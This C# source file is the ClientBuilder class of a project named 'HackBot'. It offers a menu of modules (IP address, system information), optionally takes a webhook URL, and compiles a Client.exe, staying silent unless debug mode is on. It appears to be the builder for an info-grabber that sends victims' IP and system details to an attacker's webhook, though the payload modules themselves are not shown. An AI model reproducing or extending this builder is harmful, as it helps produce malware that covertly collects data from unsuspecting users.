using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using HackBot.Modules;

namespace HackBot.ClientBuilder
{
    public class ClientBuilder
    {
        private List<IModule> _modules;
        private CodeGenerator _codeGenerator;
        private Compiler _compiler;

        public ClientBuilder()
        {
            _modules = new List<IModule>
            {
                new IPModule(),
                new SystemInfoModule()
            };
            _codeGenerator = new CodeGenerator();
            _compiler = new Compiler();
        }

        public async Task BuildAsync()
        {
            var menuSystem = new MenuSystem(_modules);
            var (selectedModules, debugEnabled, webhookEnabled) = await menuSystem.ShowMenuAsync();

            if (selectedModules.Count == 0)
            {
                Console.WriteLine("\nNo modules selected. Exiting...");
                return;
            }

            string webhookUrl = null;
            if (webhookEnabled)
            {
                Console.Clear();
                Console.WriteLine("Enter Webhook URL: ");
                webhookUrl = Console.ReadLine();
                
                if (string.IsNullOrWhiteSpace(webhookUrl))
                {
                    Console.WriteLine("Webhook URL cannot be empty. Exiting...");
                    Console.ReadKey();
                    return;
                }
            }

            Console.Clear();
            
            if (debugEnabled)
            {
                Console.WriteLine("=== DEBUG MODE ENABLED ===\n");
                Console.WriteLine($"Selected modules: {string.Join(", ", selectedModules)}");
                Console.WriteLine($"Total modules: {selectedModules.Count}");
                Console.WriteLine();
                Console.WriteLine("Generating client code...\n");
            }

            var sourceCode = _codeGenerator.GenerateClientCode(selectedModules, _modules, debugEnabled, webhookEnabled, webhookUrl);
            
            if (debugEnabled)
            {
                Console.WriteLine("\n=== GENERATED SOURCE CODE ===");
                Console.WriteLine(sourceCode);
                Console.WriteLine("=== END SOURCE CODE ===\n");
            }
            
            var currentDir = Directory.GetCurrentDirectory();
            var projectRoot = currentDir;
            
            if (currentDir.Contains("bin"))
            {
                var binIndex = currentDir.IndexOf("bin");
                projectRoot = currentDir.Substring(0, binIndex).TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
            }
            
            var outputPath = Path.Combine(projectRoot, "Client");
            
            if (debugEnabled)
            {
                Console.WriteLine($"=== DEBUG INFO ===");
                Console.WriteLine($"Current directory: {currentDir}");
                Console.WriteLine($"Project root: {projectRoot}");
                Console.WriteLine($"Output path: {outputPath}");
                Console.WriteLine($"Final executable: {Path.ChangeExtension(outputPath, ".exe")}");
                Console.WriteLine();
                Console.WriteLine($"Output directory: {projectRoot}");
                Console.WriteLine("Compiling Client.exe...\n");
            }

            if (_compiler.CompileToExe(sourceCode, outputPath, debugEnabled))
            {
                if (debugEnabled)
                {
                    var exePath = Path.ChangeExtension(outputPath, ".exe");
                    var dllPath = Path.ChangeExtension(outputPath, ".dll");
                    var batPath = Path.ChangeExtension(outputPath, ".bat");
                    
                    if (File.Exists(exePath))
                    {
                        Console.WriteLine($"Successfully built Client.exe!");
                        Console.WriteLine($"Location: {exePath}");
                    }
                    else if (File.Exists(batPath))
                    {
                        Console.WriteLine($"Successfully built Client.bat launcher!");
                        Console.WriteLine($"Location: {batPath}");
                        Console.WriteLine($"Run Client.bat to execute the application.");
                    }
                    else if (File.Exists(dllPath))
                    {
                        Console.WriteLine($"Successfully built Client.dll!");
                        Console.WriteLine($"Location: {dllPath}");
                        Console.WriteLine($"Run with: dotnet Client.dll");
                    }
                }
            }
            else
            {
                if (debugEnabled)
                    Console.WriteLine("Failed to compile Client.exe. Check errors above.");
            }

            if (debugEnabled)
            {
                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
            }
        }
    }
}
